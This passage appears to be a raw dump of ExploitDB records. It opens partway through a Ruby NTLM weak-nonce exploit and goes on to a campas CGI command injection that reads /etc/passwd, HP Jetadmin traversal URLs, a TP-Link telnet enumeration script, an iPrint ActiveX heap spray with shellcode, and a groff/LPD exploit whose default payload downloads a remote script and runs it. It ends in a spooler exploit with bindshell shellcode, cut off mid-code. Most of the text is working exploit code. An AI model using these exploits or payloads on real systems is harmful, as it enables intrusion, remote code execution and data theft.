+\r\n\t"ff534d4272000000001801c00000000000000000000000000000866100005480003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200"\r\n\r\n\t# connect and send Negotiate Protocol Request\r\n\tso = TCPSocket.open(@host, port)\r\n\tn = neg_proto_packet_1.scan(/../).map { |s| s.to_i(16) }\r\n\tj = n.pack("C*")\r\n\tso.write(j)\r\n\tresp = so.recvfrom(2000)\r\n\r\n\tj = resp.to_s[0x49..0x49+7]\r\n\tvuelta = j\r\n\r\n\ttest = j.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }\r\n\tchallenge = test.to_s\r\n\r\n\tt = resp.to_s[0x3c,4]\r\n\ttt = t.unpack("C*").map  { |v|  ("%.2X" % (v)).chomp } \r\n\r\n\treturn  tt[3]+tt[2]+tt[1]+tt[0]\r\n  end\r\n\r\n  def run\r\n    loop do\r\n      t = getChallenge\r\n      t = t.to_i 16\r\n      @t_values.push t\r\n      t += @encryption_key_count\r\n\r\n      x0 = @sg.apply t\r\n      3.times do |t|\r\n        x = @lcg.apply x0\r\n        y = @lcg.apply x \r\n\r\n        j = y % 128\r\n\r\n        @j_values[j] += 1\r\n        @x_values[j] = x\r\n\r\n        x0 = y\r\n      end\r\n\r\n      @x_values.show\r\n      break unless @j_values.include? 0\r\n      @encryption_key_count += 0x100\r\n      @attempts += 1\r\n      #break if @attempts == 3000\r\n    end\r\n  end\r\n\r\n  def report\r\n    (0...128).each do |j|\r\n      puts "[0x%02x: 0x%02x]: 0x%08x" % [ j, @j_values[j], @x_values[j] ]\r\n    end\r\n\r\n    puts "%d attempts" % @attempts\r\n    puts "encryption_key_count: %x" % @encryption_key_count\r\n\r\n    @x_values.dump\r\n    @t_values.dump\r\n  end\r\nend\r\n\r\nraise RuntimeError, "invalid parameters!" unless ARGV.length == 1\r\nattack = RtlRandomAttack.new ARGV[0]\r\nattack.run\r\nattack.report\r\n\r\n\r\n### test values\r\n#m = 2 ** 31 - 1\r\n#ct =   0xf2449d5a\r\n#kc =   0x00572c00\r\n#seed = 0xc99a9bca\r\n#x =    0x9866fc06\r\n#j =    0x12\r\n\r\n====generate_challenges.rb====:\r\n#!/usr/bin/env ruby -w \r\n\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\n# Proof-of-concept challenge predictor exploit\r\n# challenges generator\r\n# Hernan Ochoa & Agustin Azubel\r\n\r\n\r\nx_values = Array.new  128\r\nFile.open "x_values.log", "r" do |f|\r\n  f.readlines.each_with_index do |line, i|\r\n    x_values[i] = line.to_i 16\r\n  end\r\nend\r\n\r\ndef swap n\r\n  s = "%08x" % n\r\n  return s[6,2] + s[4,2] + s[2, 2] + s[0,2]\r\nend\r\n\r\nchallenges = Array.new\r\nx_values.each do |x|\r\n  x_values.each do |y|\r\n    next if x == y\r\n    a = swap(x) + swap(y)\r\n    challenges.push a\r\n\r\n    b = swap(x | 0x80000000) + swap(y)\r\n    challenges.push b\r\n\r\n    c = swap(x) + swap(y | 0x80000000)\r\n    challenges.push c\r\n  end\r\nend\r\n\r\n\r\nFile.open "challenges.log", "wb+" do |f|\r\n  challenges.sort.uniq.each do |c|\r\n    f.puts c\r\n  end\r\nend\r\n\r\n7.References\r\n------------\r\n\r\n[1] Microsoft SMB Protocol and CIFS Protocol Overview\r\nhttp://msdn.microsoft.com/en-us/library/aa365233(VS.85).aspx\r\n\r\n[2] Microsoft NTLM\r\nhttp://msdn.microsoft.com/en-us/library/aa378749(VS.85).aspx\r\n\r\n[3] Microsoft Security Bulletin Advance Notification for February 2010\r\nhttp://www.microsoft.com/technet/security/Bulletin/ms10-feb.mspx\r\n\r\n[4] Bruce Schneier, Applied Cryptography (Second Edition), 1996.\r\nChapter 16, pp 369.\r\n\r\n8.Disclaimer\r\n------------\r\n\r\nThe contents of this advisory are copyright (c) 2010 Hernan Ochoa, and\r\nmay be distributed freely provided that no fee is charged for\r\ndistribution and proper credit is given.', u'description': u'Microsoft Windows - NTLM Weak Nonce (MS10-012)', u'platform': u'windows', u'author': u'Hernan Ochoa', u'cve': [u'CVE-2010-0231'], u'source': u'ExploitDB', u'date': u'2010-10-17T00:00:00+00:00', u'_id': 15266, u'type': u'remote', u'port': 0}

CVE: []
Description: NCSA httpd-campas 1.2 - sample script
{u'code': u'source: http://www.securityfocus.com/bid/1975/info\r\n\r\nCampas is a sample CGI script shipped with some older versions of NCSA HTTPd, an obsolete web server package. The versions that included the script could not be determined as the server is no longer maintained, but version 1.2 of the script itself is known to be vulnerable. The script fails to properly filter user supplied variables, and as a result can be used to execute commands on the host with the privileges of the web server. Commands can be passed as a variable to the script, separated by %0a (linefeed) characters. See exploit for example. Successful exploitation of this vulnerability could be used to deface the web site, read any files the server process has access to, get directory listings, and execute anything else the web server has access to. \r\n\r\n> telnet target 80\r\n[...]\r\nGET /cgi-bin/campas?%0acat%0a/etc/passwd%0a\r\n<PRE>\r\nroot:x:0:1:Super-User:/export/home/root:/sbin/sh\r\ndaemon:x:1:1::/:\r\nbin:x:2:2::/usr/bin:\r\nsys:x:3:3::/:\r\nadm:x:4:4:Admin:/var/adm:\r\nlp:x:71:8:Line Printer Admin:/usr/spool/lp:\r\nsmtp:x:0:0:Mail Daemon User:/:/bin/false\r\n[...]', u'description': u'NCSA httpd-campas 1.2 - sample script', u'platform': u'cgi', u'author': u'Francisco Torres', u'cve': [], u'source': u'ExploitDB', u'date': u'1997-07-15T00:00:00+00:00', u'_id': 20423, u'type': u'remote', u'port': 0}

CVE: []
Description: HP Web Jetadmin 7.5.2456 - setinfo.hts Script Directory Traversal
{u'code': u"source: http://www.securityfocus.com/bid/9972/info\r\n\r\nIt has been reported that HP Web JetAdmin may be prone to a directory traversal vulnerability allowing remote attackers to access information outside the server root directory. The problem exists due to insufficient sanitization of user-supplied data passed via the 'setinclude' parameter of 'setinfo.hts' script.\r\n\r\nThis vulnerability can be combined with HP Web Jetadmin Firmware Update Script Arbitrary File Upload Weakness (BID 9971) to upload malicious files to a vulnerable server in order to gain unauthorized access to a host. \r\n\r\nThis issue has been tested with an authenticated account on HP Web Jetadmin version 7.5.2546 running on a Windows platform.\r\n\r\nhttps://www.example.com:8443/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../../../boot.ini\r\nhttps://www.example.com:8443/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../auth/local.users\r\nhttps://www.example.com:8443/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../hpjwja/firmware/printer/test.inc", u'description': u'HP Web Jetadmin 7.5.2456 - setinfo.hts Script Directory Traversal', u'platform': u'windows', u'author': u'wirepair', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-03-24T00:00:00+00:00', u'_id': 23879, u'type': u'remote', u'port': 0}

CVE: []
Description: TP-Link PS110U Print Server TL - Sensitive Information Enumeration
{u'code': u'# Exploit Title: TP-Link Print Server Sensitive Information Enumeration\r\n# Exploit Author: SANTHO\r\n# Vendor Homepage: http://www.tp-link.com\r\n# Software Link: http://www.tp-link.com/en/products/details/?model=TL-PS110U\r\n# Version: TL PS110U\r\nTP-Link TL PS110U Print Server runs telnet service which enables an\r\nattacker to access the configuration details without authentication. The\r\nPoC can extract device name, MAC address, manufacture name, Printer model,\r\nand SNMP Community Strings.\r\n\r\n*Sample Output*\r\n\r\nroot@bt# ./tplink-enum.py 10.0.0.2\r\n\r\nDevice Name : 1P_PrintServABCD\r\n\r\nNode ID : AA-AA-AA-AA-AA-AA\r\n\r\nManufacture: Hewlett-Packard\r\n\r\nModel: HP LaserJet M1005\r\n\r\nCommunity 1: public Read-Only\r\n\r\nCommunity 2: public Read-Only\r\n\r\nimport telnetlib\r\nimport sys\r\nhost = sys.argv[1]\r\ntn = telnetlib.Telnet(host)\r\ntn.read_until("Password:")\r\ntn.write("\\r\\n")\r\ntn.read_until("choice")\r\ntn.write("1\\r\\n")\r\ntn.read_until("choice")\r\ntn.write("1\\r\\n")\r\ndata = tn.read_until("choice")\r\nfor i in data.split("\\r\\n"):\r\n\tif "Device Name" in i:\r\n\t\tprint i.strip()\r\n\tif "Node ID" in i:\r\n\t\tprint i.strip()\r\ntn.write("0\\r\\n")\r\ntn.read_until("choice")\r\ntn.write("2\\r\\n")\r\ndata = tn.read_until("choice")\r\nfor i in data.split("\\r\\n"):\r\n\tif "Manufacture:" in i:\r\n\t\tprint i.strip()\r\n\tif "Model:" in i:\r\n\t\tprint i.strip()\r\ntn.write("0\\r\\n")\r\ntn.read_until("choice")\r\ntn.write("5\\r\\n")\r\ndata = tn.read_until("choice")\r\nfor i in data.split("\\r\\n"):\r\n\tif "Community" in i:\r\n\t\tprint i.strip()', u'description': u'TP-Link PS110U Print Server TL - Sensitive Information Enumeration', u'platform': u'hardware', u'author': u'SANTHO', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-06-19T00:00:00+00:00', u'_id': 26318, u'type': u'remote', u'port': 0}

CVE: []
Description: Novell iPrint 5.52 - ActiveX 'GetDriverSettings()' Command Execution
{u'code': u'<!--\r\nNovell iPrint <= 5.52 ActiveX GetDriverSettings() Remote Exploit (ZDI-10-256)\r\nCoded By:\tDr_IDE\r\nReference:\thttp://www.zerodayinitiative.com/advisories/ZDI-10-256/\r\nReference:\thttp://www.vupen.com/english/advisories/2010/3023\r\nTested On:\tWindows XP SP3\r\n-->\r\n<html>\r\n<object classid=\'clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C\' id=\'target\'/></object>\r\n<script >\r\n// Calc.exe\r\nshellcode = unescape(\'%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395\'+\r\n\'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1\'+\r\n\'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e\'+\r\n\'%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5\'+\r\n\'%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f\'+\r\n\'%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5\'+\r\n\'%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525\'+\r\n\'%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e\');\r\n                       \r\nnops=unescape(\'%u9090%u9090\');\r\nheadersize =20;\r\nslackspace= headersize + shellcode.length;\r\nwhile(nops.length< slackspace) nops+= nops;\r\nfillblock= nops.substring(0, slackspace);\r\nblock= nops.substring(0, nops.length- slackspace);\r\nwhile( block.length+ slackspace<0x50000) block= block+ block+ fillblock;\r\nmemory=new Array();\r\nfor( counter=0; counter<200; counter++) memory[counter]= block + shellcode;\r\nret=\'\';\r\nfor( counter=0; counter<=250; counter++) ret+=unescape("%0C%0C%0C%0C");    \r\n\r\narg1 = \'printer\';\r\narg2 = \'realm\';\r\narg3 = \'user\';\r\narg4 = \'pass\';\r\n\r\n//The code is interesting here, there are two different calls but they both actually\r\n//hit the same code within the app. GetDriverSettings2() is triggered internally by both calls.\r\ntarget.GetDriverSettings(ret,arg2,arg3,arg4);\r\n//target.GetDriverSettings2(ret,arg2,arg3,arg4);\r\n</script>\r\n</html>\r\n\r\n#http://pocoftheday.blogspot.com', u'description': u"Novell iPrint 5.52 - ActiveX 'GetDriverSettings()' Command Execution", u'platform': u'windows', u'author': u'Dr_IDE', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-01-19T00:00:00+00:00', u'_id': 16014, u'type': u'remote', u'port': 0}

CVE: []
Description: GNU groff 1.1x - xploitation Via LPD
{u'code': u'source: http://www.securityfocus.com/bid/3103/info\r\n\r\nlpd is the print spooling daemon. It is used to support network printing on a variety of unix platforms.\r\n\r\nThe version of lpd that ships with linux systems invokes groff to process documents that are to be printed. The groff utility used to process images, \'pic\', contains a vulnerability that can be exploited to execute arbitrary commands on the victim.\r\n\r\nIt may be possible for remote attackers to exploit this vulnerability through lpd.\r\n\r\n#include<stdio.h>\r\n       ///////////////////////////////////////////////////////////////////\r\n      ///      //     //   ///   ////     ////      //      //////______/\r\n     ///  //  // //////  / / /  ///  ////  ////  ////  //////////______/\r\n    ///     ///    ///  // //  ///  ////  ////  ////     ///////    ///\r\n   ///  //  // //////  /////  ///  ////  ////  ////  //////////____///\r\n  ///  //  // //////  /////  ///  ////  ////  ////  /////////////////\r\n ///  //  //     //  /////  ////     //////  ////      /////////////\r\n///////////////////////////////////////////////////////////////////\r\n     //              \\\\  -- zen-parse --  \\\\\r\n    //                \\\\___________________\\\\\r\n   //                  \\    Remote access    \\\r\n  //                    \\_____________________\\\r\n\r\n//               pic format string exploit\r\n//               =========================\r\n// This version -  Sat Jun 23 21:35:31 NZST 2001\r\n// (updated to fix broken link Thu Jul 27 23:45:34 NZST 2001)\r\n//\r\n// pic is part of the groff package. It is used by troff-to-ps.fpi as uid lp\r\n// when perl, troff and LPRng are installed.\r\n//\r\n// The address given is not the exact address, but it works.\r\n// (see /* comments below */ for information on why it\'s not the exact address)\r\n//\r\n// The offset given is (close enough to) the address for the\r\n// version of /usr/bin/pic from the rpm that comes redhat 7.0\r\n// (groff-1.16-7) The method used to find the offset in your\r\n// version of pic could be something like this :-\r\n/*\r\n\r\nbash-2.04$ gdb -q /usr/bin/pic\r\n(no debugging symbols found)...(gdb)\r\n(gdb) break getopt\r\nBreakpoint 1 at 0x8048e94\r\n(gdb) display/i $eip\r\n(gdb) r -S\r\nStarting program: /usr/bin/pic -S\r\nBreakpoint 1 at 0x4014d552: file getopt.c, line 987.\r\n\r\nBreakpoint 1, getopt (argc=2, argv=0xbffffa84,\r\n    optstring=0x8060bc9 "T:CDSUtcvnxzpf") at getopt.c:987\r\n987     getopt.c: No such file or directory.\r\n1: x/i $eip  0x4014d552 <getopt+18>:    mov    0x10(%ebp),%ecx\r\n(gdb)\r\n (\r\n   type nexti a few (mebe a dozen or 2?)  times until you see something like\r\n                movl   $0x1,%ebx\r\n   in which case the next instruction contains safe_address, or\r\n                movl   $0x1,0xsomeaddress\r\n   in which case safe_address is 0xsomeaddress\r\n\r\n   IE: It is the the address used by the first instructions\r\n   that assign a value of 1 to an address after the getopt() call.\r\n\r\n )\r\n1: x/i $eip  0x80523c2 <strcpy+37758>:  mov    $0x1,%ebx\r\n(gdb)\r\n0x80523c7       31      in ../sysdeps/generic/strcpy.c\r\n1: x/i $eip  0x80523c7 <strcpy+37763>:  mov    %ebx,0x806feec\r\n(gdb) q\r\n\r\nIn this case, the address is 0x0806feec, however you may need to aim for\r\njust a little before that, due to what are probably rounding errors in the\r\nconversion between int->float->int, and using the least significant\r\ndigits.\r\n\r\nThis means: You may need to play a little to get it working on your machine.\r\n\r\n*/\r\n\r\n\r\n#define PICURL  "http://crash.ihug.co.nz/~Sneuro/samplelpdscript.sh"\r\n#error "http://mp3.com/cosv needs visiting"\r\n#define SAFER_ADDRESS 0x0806feeb\r\n#define QUEUE "lp"\r\n\r\nFILE *pip;\r\nchar *payload(char *cmd,int safer);\r\nchar *eos(char *s)\r\n{\r\n return s+strlen(s);\r\n}\r\n\r\noutput(char *s,char*addr,FILE*pip)\r\n{\r\n char v[]=\r\n"Aroot@%s+666\\n"\r\n"CA\\n"\r\n"D2001-06-23-08:59:18.714\\n"\r\n"Hclarity.local\\n"\r\n"J/tmp/hack-attempt\\n"\r\n"Lroot\\n"\r\n"Proot\\n"\r\n"Qlp\\n"\r\n"N/tmp/sh.c\\n"\r\n"fdfA666%s\\n"\r\n"UdfA666%s\\n";\r\n\r\n char nv[1024];\r\n\r\n fprintf(pip,"\\x2"QUEUE"\\n");\r\n sprintf(nv,v,addr,addr,addr);\r\n fprintf(pip,"\\x2%d cfA666%s\\n",strlen(nv),addr);\r\n fprintf(pip,"%s",nv);\r\n fflush(pip);\r\n putc(0,pip);\r\n fflush(pip);\r\n fprintf(pip,"\\x3%d dfA666%s\\n",strlen(s),addr);\r\n fprintf(pip,"%s",s);\r\n fflush(pip);\r\n putc(0,pip);\r\n fflush(pip);\r\n}\r\n\r\n\r\nmain(int argc,char *argv[])\r\n{\r\n int safer=SAFER_ADDRESS;\r\n char pcmd[1024];\r\n char *cmd=0;\r\n char *addr=0;\r\n char *evil=0;\r\n\r\n if(argc==1)addr="-h";\r\n if(!addr)addr=(char*)malloc(256);\r\n if(argc>2)safer=(int)strtoul(argv[2],0,16);\r\n if(argc>1)addr=argv[1];\r\n if(argc>3)cmd=argv[3];\r\n else\r\n {\r\n  if(!cmd)cmd=(char*)malloc(512);\r\n  strcpy(cmd,\r\n    "export HOME=/tmp;/usr/bin/lynx -dump "PICURL\r\n    ">/tmp/lpd.cmd.$$;chmod +x /tmp/lpd.cmd.$$;/tmp/lpd.cmd.$$");\r\n }\r\n if(!*addr)addr=(char*)malloc(256);\r\n if(!strcmp(addr,"-h"))\r\n {\r\n  printf("%s ip-address safer-address \'commands in quotes\'\\n",argv[0]);\r\n  exit(1);\r\n }\r\n evil=payload(cmd,safer);\r\n sprintf(pcmd,"nc %s 515",addr);\r\n pip=popen(pcmd,"w");\r\n output(evil,addr,pip);\r\n if(pclose(pip))\r\n {\r\n  printf("It might not\'ve worked.\\nThe command returned a funny value.\\n");\r\n  printf("check you have netcat (nc) in your path.\\n");\r\n  exit(1);\r\n }\r\n}\r\n\r\n\r\nchar *payload(char *cmd,int safer)\r\n{\r\n char *retstr;\r\n char *tmp;\r\n retstr=(char*)malloc(4096);\r\n sprintf(retstr,".PS\\n");\r\n\r\n        //  %f is 8 bytes long the two values are  \\\\\r\n       //  needed. the value was just the first one \\\\\r\n      // that I had in there... it it ain\'t broke... \\\\\r\n\r\n tmp=eos(retstr);\r\n sprintf(tmp,"plot %5.20f \\"%%n\\"\\n",safer,0xbffffa08);\r\n tmp=eos(retstr);\r\n sprintf(tmp,"sh X%sX\\n",cmd);\r\n tmp=eos(retstr);\r\n sprintf(tmp,".PE\\n");\r\n tmp=eos(retstr);\r\n sprintf(tmp,"This is the way we hack the printer,\\n");\r\n tmp=eos(retstr);\r\n sprintf(tmp,"Hack the printer, hack the printer.\\n");\r\n tmp=eos(retstr);\r\n sprintf(tmp,"This is the way we hack the printer,\\n");\r\n tmp=eos(retstr);\r\n sprintf(tmp,"when they are running a vulnerable version\\n");\r\n tmp=eos(retstr);\r\n sprintf(tmp,"of groff.\\n");\r\n tmp=eos(retstr);\r\n return retstr;\r\n}', u'description': u'GNU groff 1.1x - xploitation Via LPD', u'platform': u'linux', u'author': u'zen-parse', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-06-23T00:00:00+00:00', u'_id': 21037, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2006-5854']
Description: Novell Client 4.91 - 'NWSPOOL.dll' Remote Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/21220/info\r\n\r\nNovell Client is prone to a remote buffer-overflow vulnerability. Successful exploits may result in a denial-of-service condition or arbitrary code execution. Remote, anonymous attackers may exploit this issue via RPC requests.\r\n\r\nThis issue affects Novell Client 4.91; other versions may also be vulnerable.\r\n\r\n/********************Private exploit- internal use only*****************\r\n Title: Universal exploit for vulnerable printer providers (spooler service).\r\n Vulnerability: Insecure EnumPrintersW() calls\r\n Author: Andres Tarasco Acu\ufffda - atarasco@514.es\r\n Website: http://www.514.es\r\n \r\n\r\n This code should allow to gain SYSTEM privileges with the following software:\r\n blink !blink! blink!\r\n\r\n - DiskAccess NFS Client (dapcnfsd.dll v0.6.4.0) - REPORTED & NOTFIXED -0day!!! \r\n - Citrix Metaframe - cpprov.dll  - FIXED\r\n - Novell (nwspool.dll  - CVE-2006-5854 - untested)\r\n - More undisclosed stuff =)\r\n\r\n  If this code crashes your spooler service (spoolsv.exe) check your \r\n  "vulnerable" printer providers at:\r\n  HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Providers\r\n\r\n  Workaround: Trust only default printer providers "Internet Print Provider" \r\n  and "LanMan Print Services" and delete the other ones.\r\n \r\n  And remember, if it doesnt work for you, tweak it yourself. Do not ask\r\n\r\n\r\n  D:\\Programaci\ufffdn\\EnumPrinters\\Exploits>testlpc.exe\r\n [+] Citrix Presentation Server - EnumPrinterW() Universal exploit\r\n [+] Exploit coded by Andres Tarasco - atarasco@514.es\r\n \r\n\r\n [+] Connecting to spooler LCP port \\RPC Control\\spoolss\r\n [+] Trying to locate valid address (1 tries)\r\n [+] Mapped memory. Client address: 0x003d0000\r\n [+] Mapped memory. Server address: 0x00a70000\r\n [+] Targeting return address to  : 0x00A700A7\r\n [+] Writting to shared memory...\r\n [+] Written 0x1000 bytes\r\n [+] Exploiting vulnerability....\r\n [+] Exploit complete. Now Connect to 127.0.0.1:51477\r\n \r\n\r\n D:\\Programaci\ufffdn\\EnumPrinters>nc localhost 51477\r\n Microsoft Windows XP [Versi\ufffdn 5.1.2600]\r\n (C) Copyright 1985-2001 Microsoft Corp.\r\n\r\n C:\\WINDOWS\\system32>whoami\r\n NT AUTHORITY\\SYSTEM\r\n\r\n\r\n  514 ownz u\r\n ********************Private exploit- internal use only*****************/\r\n#include <stdio.h>\r\n#include <windows.h>\r\n#include <Winspool.h>\r\n#pragma comment(lib,"Winspool.lib")\r\n\r\n\r\n#define REQUIRED_SIZE 0x1000\r\n#define MAXLOOPS      10000 \r\nunsigned char shellcode[] =\r\n/*Just a metasploit shellcode - Bindshell 51477 */\r\n"\\x2b\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xe6"\r\n"\\xc0\\xc6\\x10\\x83\\xeb\\xfc\\xe2\\xf4\\x1a\\xaa\\x2d\\x5d\\x0e\\x39\\x39\\xef"\r\n"\\x19\\xa0\\x4d\\x7c\\xc2\\xe4\\x4d\\x55\\xda\\x4b\\xba\\x15\\x9e\\xc1\\x29\\x9b"\r\n"\\xa9\\xd8\\x4d\\x4f\\xc6\\xc1\\x2d\\x59\\x6d\\xf4\\x4d\\x11\\x08\\xf1\\x06\\x89"\r\n"\\x4a\\x44\\x06\\x64\\xe1\\x01\\x0c\\x1d\\xe7\\x02\\x2d\\xe4\\xdd\\x94\\xe2\\x38"\r\n"\\x93\\x25\\x4d\\x4f\\xc2\\xc1\\x2d\\x76\\x6d\\xcc\\x8d\\x9b\\xb9\\xdc\\xc7\\xfb"\r\n"\\xe5\\xec\\x4d\\x99\\x8a\\xe4\\xda\\x71\\x25\\xf1\\x1d\\x74\\x6d\\x83\\xf6\\x9b"\r\n"\\xa6\\xcc\\x4d\\x60\\xfa\\x6d\\x4d\\x50\\xee\\x9e\\xae\\x9e\\xa8\\xce\\x2a\\x40"\r\n"\\x19\\x16\\xa0\\x43\\x80\\xa8\\xf5\\x22\\x8e\\xb7\\xb5\\x22\\xb9\\x94\\x39\\xc0"\r\n"\\x8e\\x0b\\x2b\\xec\\xdd\\x90\\x39\\xc6\\xb9\\x49\\x23\\x76\\x67\\x2d\\xce\\x12"\r\n"\\xb3\\xaa\\xc4\\xef\\x36\\xa8\\x1f\\x19\\x13\\x6d\\x91\\xef\\x30\\x93\\x95\\x43"\r\n"\\xb5\\x93\\x85\\x43\\xa5\\x93\\x39\\xc0\\x80\\xa8\\x0f\\x05\\x80\\x93\\x4f\\xf1"\r\n"\\x73\\xa8\\x62\\x0a\\x96\\x07\\x91\\xef\\x30\\xaa\\xd6\\x41\\xb3\\x3f\\x16\\x78"\r\n"\\x42\\x6d\\xe8\\xf9\\xb1\\x3f\\x10\\x43\\xb3\\x3f\\x16\\x78\\x03\\x89\\x40\\x59"\r\n"\\xb1\\x3f\\x10\\x40\\xb2\\x94\\x93\\xef\\x36\\x53\\xae\\xf7\\x9f\\x06\\xbf\\x47"\r\n"\\x19\\x16\\x93\\xef\\x36\\xa6\\xac\\x74\\x80\\xa8\\xa5\\x7d\\x6f\\x25\\xac\\x40"\r\n"\\xbf\\xe9\\x0a\\x99\\x01\\xaa\\x82\\x99\\x04\\xf1\\x06\\xe3\\x4c\\x3e\\x84\\x3d"\r\n"\\x18\\x82\\xea\\x83\\x6b\\xba\\xfe\\xbb\\x4d\\x6b\\xae\\x62\\x18\\x73\\xd0\\xef"\r\n"\\x93\\x84\\x39\\xc6\\xbd\\x97\\x94\\x41\\xb7\\x91\\xac\\x11\\xb7\\x91\\x93\\x41"\r\n"\\x19\\x10\\xae\\xbd\\x3f\\xc5\\x08\\x43\\x19\\x16\\xac\\xef\\x19\\xf7\\x39\\xc0"\r\n"\\x6d\\x97\\x3a\\x93\\x22\\xa4\\x39\\xc6\\xb4\\x3f\\x16\\x78\\x16\\x4a\\xc2\\x4f"\r\n"\\xb5\\x3f\\x10\\xef\\x36\\xc0\\xc6\\x10";\r\n\r\ntypedef struct _UNICODE_STRING {\r\n  USHORT  Length;\r\n  USHORT  MaximumLength;\r\n  PWSTR  Buffer;\r\n} UNICODE_STRING;\r\n\r\n\r\ntypedef struct LpcSectionMapInfo{\r\n        DWORD Length;\r\n        DWORD SectionSize;\r\n        DWORD ServerBaseAddress;\r\n} LPCSECTIONMAPINFO;\r\n\r\n\r\ntypedef struct LpcSectionInfo {\r\n        DWORD Length;\r\n        HANDLE SectionHandle;\r\n        DWORD Param1;\r\n        DWORD SectionSize;\r\n        DWORD ClientBaseAddress;\r\n        DWORD ServerBaseAddress;\r\n} LPCSECTIONINFO;\r\n\r\n\r\n#define SHARED_SECTION_SIZE 0x1000\r\n\r\ntypedef struct _OBJDIR_INFORMATION {\r\n  UNICODE_STRING          ObjectName;\r\n  UNICODE_STRING          ObjectTypeName;\r\n  BYTE                    Data[1];\r\n} OBJDIR_INFORMATION;\r\n\r\ntypedef struct _OBJECT_ATTRIBUTES {\r\n    ULONG Length;\r\n    HANDLE RootDirectory;\r\n    UNICODE_STRING *ObjectName;\r\n    ULONG Attributes;\r\n    PVOID SecurityDescriptor;        \r\n    PVOID SecurityQualityOfService;  \r\n} OBJECT_ATTRIBUTES;\r\n\r\n#define InitializeObjectAttributes( p, n, a, r, s ) { \\\r\n    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \\\r\n    (p)->RootDirectory = r;                             \\\r\n    (p)->Attributes = a;                                \\\r\n    (p)->ObjectName = n;                                \\\r\n    (p)->SecurityDescriptor = s;                        \\\r\n    (p)->SecurityQualityOfService = NULL;               \\\r\n    }\r\n\r\n\r\ntypedef DWORD (WINAPI *NTCREATESECTION)(\r\n   HANDLE* SectionHandle,\r\n   unsigned long DesiredAccess,\r\n   OBJECT_ATTRIBUTES *ObjectAttributes,\r\n   PLARGE_INTEGER MaximumSize,\r\n   unsigned long PageAttributess,\r\n   unsigned long SectionAttributes,\r\n   HANDLE FileHandle);\r\n\r\ntypedef DWORD (WINAPI *NTCONNECTPORT)(\r\n   HANDLE *ClientPortHandle, \r\n   UNICODE_STRING *ServerPortName, \r\n   SECURITY_QUALITY_OF_SERVICE *SecurityQos, \r\n   DWORD *ClientSharedMemory,\r\n   DWORD *ServerSharedMemory,\r\n   DWORD *MaximumMessageLength,\r\n   DWORD *ConnectionInfo OPTIONAL, \r\n   DWORD *ConnectionInfoLength); \r\n\r\n\r\nLARGE_INTEGER ConnectToLPCPort(void){\r\n   /* Thanks goes to Cesar Cerrudo for the WLSI paper */\r\n\tHANDLE hPort;\r\n\tLPCSECTIONINFO sectionInfo;\r\n\tLPCSECTIONMAPINFO mapInfo;\r\n\tbyte ConnectDataBuffer[100];\r\n\tDWORD Size = sizeof(ConnectDataBuffer);\r\n   WCHAR  * uString=L"\\\\RPC Control\\\\spoolss";\r\n\tDWORD i;\r\n\tUNICODE_STRING uStr;\r\n   LARGE_INTEGER ret;\r\n   \r\n\r\n   NTCONNECTPORT NtConnectPort;\r\n   NTCREATESECTION NtCreateSection;\r\n\r\n   ret.QuadPart=0;\r\n\tfor (i=0;i<100;i++)\r\n\t\tConnectDataBuffer[i]=0x0;\r\n\r\n\r\n   NtConnectPort= (NTCONNECTPORT)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtConnectPort");\r\n   NtCreateSection= (NTCREATESECTION)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");\r\n\r\n   if ( (!NtConnectPort) || (!NtCreateSection) ) {\r\n      printf("[-] Error Loading functions\\n");\r\n   } else {\r\n   \tHANDLE hSection;\r\n\t   LARGE_INTEGER SecSize;\r\n\t   DWORD maxSize=0;\r\n\t   SECURITY_QUALITY_OF_SERVICE qos;\r\n      DWORD qosSize=4;\r\n\r\n      //create shared section\t\r\n      SecSize.LowPart=REQUIRED_SIZE;//0x1000;\r\n\t   SecSize.HighPart=0x0;\r\n\r\n\t   qos.Length =(DWORD)&qosSize;\r\n\t   qos.ImpersonationLevel =SecurityIdentification;\r\n\t   qos.ContextTrackingMode =0x01000101;\r\n\t   qos.EffectiveOnly =0x10000;\r\n\t   \r\n\t   NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SecSize,PAGE_READWRITE,SEC_COMMIT ,NULL);\r\n      \r\n      //connect to lpc\r\n\t   memset(&sectionInfo, 0, sizeof(sectionInfo));\r\n\t   memset(&mapInfo, 0, sizeof(mapInfo));\r\n\r\n\t   sectionInfo.Length = 0x18;\r\n\t   sectionInfo.SectionHandle =hSection;\r\n\t   sectionInfo.SectionSize = SHARED_SECTION_SIZE;\r\n\t   mapInfo.Length = 0x0C;\r\n\r\n\t   uStr.Length = wcslen(uString)*2;\r\n\t   uStr.MaximumLength = wcslen(uString)*2+2;\r\n\t   uStr.Buffer =uString;\r\n\t\r\n\t   //connect to LPC port\r\n\t   if 